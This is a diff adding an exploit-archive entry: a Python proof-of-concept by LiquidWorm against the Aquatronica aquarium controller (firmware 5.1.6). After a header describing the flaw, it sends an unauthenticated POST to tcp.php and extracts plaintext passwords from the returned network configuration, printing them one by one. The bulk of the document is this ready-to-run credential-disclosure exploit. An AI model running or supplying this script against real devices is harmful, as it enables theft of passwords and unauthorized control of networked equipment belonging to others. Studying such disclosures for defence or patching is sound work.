@@ -1,0 +1,94 @@
+id: 39631
+date: 06/02/2024
+title: Aquatronica Control System 5.1.6 Password Disclosure Exploit
+author: LiquidWorm
+cves: 
+
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+#
+#
+# Aquatronica Control System 5.1.6 Passwords Leak Vulnerability
+#
+#
+# Vendor: Aquatronica s.r.l.
+# Product web page: https://www.aquatronica.com
+# Affected version: Firmware: 5.1.6
+#                   Web: 2.0
+#
+# Summary: Aquatronica's electronic AQUARIUM CONTROLLER is easy
+# to use, allowing you to control all the electrical devices in
+# an aquarium and to monitor all their parameters; it can be used
+# for soft water aquariums, salt water aquariums or both simultaneously.
+#
+# Desc: The tcp.php endpoint on the Aquatronica controller is exposed
+# to unauthenticated attackers over the network. This vulnerability
+# allows remote attackers to send a POST request which can reveal
+# sensitive configuration information, including plaintext passwords.
+# This can lead to unauthorized access and control over the aquarium
+# controller, compromising its security and potentially allowing attackers
+# to manipulate its settings.
+#
+# Tested on: Apache/2.0.54 (Unix)
+#            PHP/5.4.17
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2024-5824
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2024-5824.php
+#
+#
+# 04.05.2024
+#
+
+import requests, html, re, sys, time
+from urllib.parse import unquote
+
+program     = "TCP"
+command     = "ws_get_network_cfg"
+function_id = "TCP_XML_REQUEST"
+
+print("""
+      _________         .    .
+     (..       \_    ,  |\  /|
+      \       O  \  /|  \ \/ /
+       \______    \/ |   \  / 
+          vvvv\    \ |   /  |
+          \^^^^  ==   \_/   |
+           `\_   ===    \.  |
+           / /\_   \ /      |
+           |/   \_  \|      /
+___ ______________\________/________aquatronica_0day___
+  | |
+  | |
+  | |
+""")
+
+if len(sys.argv) != 2:
+    print("Usage: python aqua.py <ip:port>")
+    sys.exit(1)
+
+ip = sys.argv[1]
+url = f"http://{ip}/{program.lower()}.php"
+
+post_data = {'function_id' : function_id.lower(),
+             'command'     :     command.upper()}
+
+r = requests.post(url, data=post_data)
+
+if r.status_code == 200:
+    r_d = unquote(r.text)
+    f_d_r = html.unescape(r_d)
+    regex = r'pwd="([^"]+)"'
+    rain = re.findall(regex, f_d_r)
+
+    for drops in rain:
+        print(' ',drops)
+        time.sleep(0.5)
+else:
+    print(f"Dry season! {r.status_code}")
+
+#  0day.today [2024-06-04]  #
